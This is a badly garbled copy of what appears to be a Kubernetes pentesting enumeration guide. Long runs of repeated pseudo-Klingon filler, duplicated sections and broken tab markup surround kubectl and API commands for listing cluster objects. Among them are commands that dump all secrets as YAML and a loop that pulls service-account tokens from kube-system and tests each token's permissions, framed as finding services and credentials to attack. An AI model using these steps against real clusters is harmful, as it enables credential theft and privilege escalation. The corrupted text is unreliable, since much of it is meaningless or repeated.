**chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **'oH** **'ej** **ghu'vam** **chel** **'ej** **
```bash
k get roles
k get clusterroles
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{% endtab %}
{% endtabs %}

### Get namespaces

Kubernetes supports **multiple virtual clusters** backed by the same physical cluster. These virtual clusters are called **namespaces**.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get namespaces
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{% endtab %}
{% endtabs %}

### Get secrets

{% tabs %}
{% tab title="kubectl" %}

To get secrets in Kubernetes, you can use the `kubectl` command with the `get secrets` option. This will list all the secrets in the cluster.

```bash
kubectl get secrets
```

To get more detailed information about a specific secret, you can use the `describe` command.

```bash
kubectl describe secret <secret-name>
```

Replace `<secret-name>` with the name of the secret you want to get information about.

{% endtab %}
{% endtabs %}
```
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{% endtab %}
{% endtabs %}

ghItlhpu' 'ejwI'vam vItlhutlhlaHbe'chugh, 'ej vaj vItlhutlhlaHbe'chugh token-related privileges laH.
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### tlhIngan Hol

QIn SIbI' SIbI'vam **pod vItlhutlhlaHchugh service account**. SoHvaD service account, je permissions 'ej nuqDaq vItlhutlhlaHvIS, user vItlhutlhlaHvIS vItlhutlhlaHlaH 'e' vItlhutlhlaHlaH.

{% tabs %}
{% tab title="kubectl" %}
```bash
k get serviceaccounts
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{% endtab %}
{% endtabs %}

### Get Deployments

The deployments specify the **components** that need to be **run**.

{% tabs %}
{% tab title="kubectl" %}

```bash
kubectl get deployments
```

{% endtab %}
{% endtabs %}

### Get Pods

Pods are the **smallest** and **simplest** units in the Kubernetes object model. They represent a **single instance** of a **running process** in a cluster.

{% tabs %}
{% tab title="kubectl" %}
```
.k get deployments
k get deployments -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{% endtab %}
{% endtabs %}

### Get Pods

The Pods are the actual **containers** that will **run**.

{% tabs %}
{% tab title="kubectl" %}kubectl get pods{% endtab %}
{% tab title="krew" %}kubectl krew install get-all-pods{% endtab %}
{% tab title="k9s" %}k9s{% endtab %}
{% endtabs %}

### Get Deployments

Deployments are a higher-level concept that manages **Pods** and provides **declarative updates** to them.

{% tabs %}
{% tab title="kubectl" %}kubectl get deployments{% endtab %}
{% tab title="krew" %}kubectl krew install get-all-deployments{% endtab %}
{% tab title="k9s" %}k9s{% endtab %}
{% endtabs %}

### Get Services

Services are an **abstraction** which defines a **logical set** of **Pods** and a **policy** by which to access them.

{% tabs %}
{% tab title="kubectl" %}kubectl get services{% endtab %}
{% tab title="krew" %}kubectl krew install get-all-services{% endtab %}
{% tab title="k9s" %}k9s{% endtab %}
{% endtabs %}

### Get Secrets

Secrets are **secure objects** which store **sensitive data**, such as **passwords**, **OAuth tokens**, and **SSH keys**.

{% tabs %}
{% tab title="kubectl" %}kubectl get secrets{% endtab %}
{% tab title="krew" %}kubectl krew install get-all-secrets{% endtab %}
{% tab title="k9s" %}k9s{% endtab %}
{% endtabs %}

### Get ConfigMaps

ConfigMaps are **API objects** used to store **non-confidential data** in **key-value pairs**.

{% tabs %}
{% tab title="kubectl" %}kubectl get configmaps{% endtab %}
{% tab title="krew" %}kubectl krew install get-all-configmaps{% endtab %}
{% tab title="k9s" %}k9s{% endtab %}
{% endtabs %}

### Get PersistentVolumes

PersistentVolumes are **API objects** that **store** **data** in a way that is **independent** of any **single Pod**.

{% tabs %}
{% tab title="kubectl" %}kubectl get persistentvolumes{% endtab %}
{% tab title="krew" %}kubectl krew install get-all-persistentvolumes{% endtab %}
{% tab title="k9s" %}k9s{% endtab %}
{% endtabs %}

### Get PersistentVolumeClaims

PersistentVolumeClaims are **API objects** that **request** **storage** resources.

{% tabs %}
{% tab title="kubectl" %}kubectl get persistentvolumeclaims{% endtab %}
{% tab title="krew" %}kubectl krew install get-all-persistentvolumeclaims{% endtab %}
{% tab title="k9s" %}k9s{% endtab %}
{% endtabs %}

### Get Roles

Roles are **API objects** that define **policies** for **cluster access**.

{% tabs %}
{% tab title="kubectl" %}kubectl get roles{% endtab %}
{% tab title="krew" %}kubectl krew install get-all-roles{% endtab %}
{% tab title="k9s" %}k9s{% endtab %}
{% endtabs %}

### Get RoleBindings

RoleBindings are **API objects** that **bind** **roles** to **subjects**.

{% tabs %}
{% tab title="kubectl" %}kubectl get rolebindings{% endtab %}
{% tab title="krew" %}kubectl krew install get-all-rolebindings{% endtab %}
{% tab title="k9s" %}k9s{% endtab %}
{% endtabs %}

### Get ClusterRoles

ClusterRoles are **API objects** that define **policies** for **cluster access**.

{% tabs %}
{% tab title="kubectl" %}kubectl get clusterroles{% endtab %}
{% tab title="krew" %}kubectl krew install get-all-clusterroles{% endtab %}
{% tab title="k9s" %}k9s{% endtab %}
{% endtabs %}

### Get ClusterRoleBindings

ClusterRoleBindings are **API objects** that **bind** **clusterroles** to **subjects**.

{% tabs %}
{% tab title="kubectl" %}kubectl get clusterrolebindings{% endtab %}
{% tab title="krew" %}kubectl krew install get-all-clusterrolebindings{% endtab %}
{% tab title="k9s" %}k9s{% endtab %}
{% endtabs %}

### Get Ingresses

Ingresses are **API objects** that manage **external access** to the **services** in a cluster.

{% tabs %}
{% tab title="kubectl" %}kubectl get ingresses{% endtab %}
{% tab title="krew" %}kubectl krew install get-all-ingresses{% endtab %}
{% tab title="k9s" %}k9s{% endtab %}
{% endtabs %}

### Get NetworkPolicies

NetworkPolicies are **API objects** that define **rules** to allow or deny **ingress** and **egress** traffic to **Pods**.

{% tabs %}
{% tab title="kubectl" %}kubectl get networkpolicies{% endtab %}
{% tab title="krew" %}kubectl krew install get-all-networkpolicies{% endtab %}
{% tab title="k9s" %}k9s{% endtab %}
{% endtabs %}

### Get StorageClasses

StorageClasses are **API objects** that define **classes** of **storage**.

{% tabs %}
{% tab title="kubectl" %}kubectl get storageclasses{% endtab %}
{% tab title="krew" %}kubectl krew install get-all-storageclasses{% endtab %}
{% tab title="k9s" %}k9s{% endtab %}
{% endtabs %}

### Get Nodes

Nodes are **worker machines** in Kubernetes.

{% tabs %}
{% tab title="kubectl" %}kubectl get nodes{% endtab %}
{% tab title="krew" %}kubectl krew install get-all-nodes{% endtab %}
{% tab title="k9s" %}k9s{% endtab %}
{% endtabs %}

### Get Namespaces

Namespaces are a way to **divide cluster resources** between multiple users.

{% tabs %}
{% tab title="kubectl" %}kubectl get namespaces{% endtab %}
{% tab title="krew" %}kubectl krew install get-all-namespaces{% endtab %}
{% tab title="k9s" %}k9s{% endtab %}
{% endtabs %}

### Get Events

Events are **API objects** that represent **state changes** in the cluster.

{% tabs %}
{% tab title="kubectl" %}kubectl get events{% endtab %}
{% tab title="krew" %}kubectl krew install get-all-events{% endtab %}
{% tab title="k9s" %}k9s{% endtab %}
{% endtabs %}
```
k get pods
k get pods -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{% endtab %}
{% endtabs %}

### Get Services

Kubernetes **services** are used to **expose a service in a specific port and IP** (which will act as load balancer to the pods that are actually offering the service). This is interesting to know where you can find other services to try to attack.

{% tabs %}
{% tab title="kubectl" %}
### Get Services

Kubernetes **services** are used to **expose a service in a specific port and IP** (which will act as load balancer to the pods that are actually offering the service). This is interesting to know where you can find other services to try to attack.
```
k get services
k get services -n custnamespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{% endtab %}
{% endtabs %}

### Get nodes

Get all the **nodes configured inside the cluster**.

{% tabs %}
{% tab title="kubectl" %}

```bash
kubectl get nodes
```

{% endtab %}
{% tab title="Kubernetes API" %}

```bash
curl -k https://<kubernetes-api>/api/v1/nodes -H "Authorization: Bearer <token>"
```

{% endtab %}
{% endtabs %}

### Get pods

Get all the **pods running inside the cluster**.

{% tabs %}
{% tab title="kubectl" %}

```bash
kubectl get pods --all-namespaces
```

{% endtab %}
{% tab title="Kubernetes API" %}

```bash
curl -k https://<kubernetes-api>/api/v1/pods -H "Authorization: Bearer <token>"
```

{% endtab %}
{% endtabs %}

### Get services

Get all the **services running inside the cluster**.

{% tabs %}
{% tab title="kubectl" %}

```bash
kubectl get services --all-namespaces
```

{% endtab %}
{% tab title="Kubernetes API" %}

```bash
curl -k https://<kubernetes-api>/api/v1/services -H "Authorization: Bearer <token>"
```

{% endtab %}
{% endtabs %}

### Get deployments

Get all the **deployments running inside the cluster**.

{% tabs %}
{% tab title="kubectl" %}

```bash
kubectl get deployments --all-namespaces
```

{% endtab %}
{% tab title="Kubernetes API" %}

```bash
curl -k https://<kubernetes-api>/apis/apps/v1/deployments -H "Authorization: Bearer <token>"
```

{% endtab %}
{% endtabs %}

### Get secrets

Get all the **secrets stored inside the cluster**.

{% tabs %}
{% tab title="kubectl" %}

```bash
kubectl get secrets --all-namespaces
```

{% endtab %}
{% tab title="Kubernetes API" %}

```bash
curl -k https://<kubernetes-api>/api/v1/secrets -H "Authorization: Bearer <token>"
```

{% endtab %}
{% endtabs %}

### Get configmaps

Get all the **configmaps stored inside the cluster**.

{% tabs %}
{% tab title="kubectl" %}

```bash
kubectl get configmaps --all-namespaces
```

{% endtab %}
{% tab title="Kubernetes API" %}

```bash
curl -k https://<kubernetes-api>/api/v1/configmaps -H "Authorization: Bearer <token>"
```

{% endtab %}
{% endtabs %}

### Get persistent volumes

Get all the **persistent volumes configured inside the cluster**.

{% tabs %}
{% tab title="kubectl" %}

```bash
kubectl get persistentvolumes
```

{% endtab %}
{% tab title="Kubernetes API" %}

```bash
curl -k https://<kubernetes-api>/api/v1/persistentvolumes -H "Authorization: Bearer <token>"
```

{% endtab %}
{% endtabs %}

### Get persistent volume claims

Get all the **persistent volume claims configured inside the cluster**.

{% tabs %}
{% tab title="kubectl" %}

```bash
kubectl get persistentvolumeclaims --all-namespaces
```

{% endtab %}
{% tab title="Kubernetes API" %}

```bash
curl -k https://<kubernetes-api>/api/v1/persistentvolumeclaims -H "Authorization: Bearer <token>"
```

{% endtab %}
{% endtabs %}

### Get roles

Get all the **roles configured inside the cluster**.

{% tabs %}
{% tab title="kubectl" %}

```bash
kubectl get roles --all-namespaces
```

{% endtab %}
{% tab title="Kubernetes API" %}

```bash
curl -k https://<kubernetes-api>/apis/rbac.authorization.k8s.io/v1/roles -H "Authorization: Bearer <token>"
```

{% endtab %}
{% endtabs %}

### Get role bindings

Get all the **role bindings configured inside the cluster**.

{% tabs %}
{% tab title="kubectl" %}

```bash
kubectl get rolebindings --all-namespaces
```

{% endtab %}
{% tab title="Kubernetes API" %}

```bash
curl -k https://<kubernetes-api>/apis/rbac.authorization.k8s.io/v1/rolebindings -H "Authorization: Bearer <token>"
```

{% endtab %}
{% endtabs %}

### Get cluster roles

Get all the **cluster roles configured inside the cluster**.

{% tabs %}
{% tab title="kubectl" %}

```bash
kubectl get clusterroles
```

{% endtab %}
{% tab title="Kubernetes API" %}

```bash
curl -k https://<kubernetes-api>/apis/rbac.authorization.k8s.io/v1/clusterroles -H "Authorization: Bearer <token>"
```

{% endtab %}
{% endtabs %}

### Get cluster role bindings

Get all the **cluster role bindings configured inside the cluster**.

{% tabs %}
{% tab title="kubectl" %}

```bash
kubectl get clusterrolebindings
```

{% endtab %}
{% tab title="Kubernetes API" %}

```bash
curl -k https://<kubernetes-api>/apis/rbac.authorization.k8s.io/v1/clusterrolebindings -H "Authorization: Bearer <token>"
```

{% endtab %}
{% endtabs %}

### Get events

Get all the **events happening inside the cluster**.

{% tabs %}
{% tab title="kubectl" %}

```bash
kubectl get events --all-namespaces
```

{% endtab %}
{% tab title="Kubernetes API" %}

```bash
curl -k https://<kubernetes-api>/api/v1/events -H "Authorization: Bearer <token>"
```

{% endtab %}
{% endtabs %}
```
k get nodes
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{% endtab %}
{% endtabs %}

### Get DaemonSets

**DaeamonSets** allows to ensure that a **specific pod is running in all the nodes** of the cluster (or in the ones selected). If you delete the DaemonSet the pods managed by it will be also removed.

{% tabs %}
{% tab title="kubectl" %}
```
k get daemonsets
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{% endtab %}
{% endtabs %}

### Get cronjob

Cron jobs allows to schedule using crontab like syntax the launch of a pod that will perform some action.

{% tabs %}
{% tab title="kubectl" %}
```
k get cronjobs
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{% endtab %}
{% endtabs %}

### Get configMap

configMap vItlhutlh contains a lot of information and configfile that provide to apps which run in the kubernetes. Usually You can find a lot of password, secrets, tokens which used to connecting and validating to other internal/external service.

{% tabs %}

{% tab title="kubectl" %}
```
k get configmaps # -n namespace
```
{% endtab %}

{% tab title="API" %}API{% endtab %}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{% tab title="kubectl" %}### Get "all"

{% tabs %}
{% tab title="kubectl" %}
#### tlhIngan Hol Translation:

### "mIw"

{% tabs %}
{% tab title="kubectl" %}
```
k get all
```
{% endtab %}
{% endtabs %}

### **Get Pods consumptions**

{% tabs %}
{% tab title="kubectl" %}

To get information about the resource consumption of pods in a Kubernetes cluster, you can use the following command:

```bash
kubectl top pods
```

This command will display the CPU and memory usage of each pod in the cluster.

{% endtab %}
{% endtabs %}
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### qoDwI'pu' vItlhutlh

vaj vItlhutlh pods vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj vItlhutlh vay' vaj 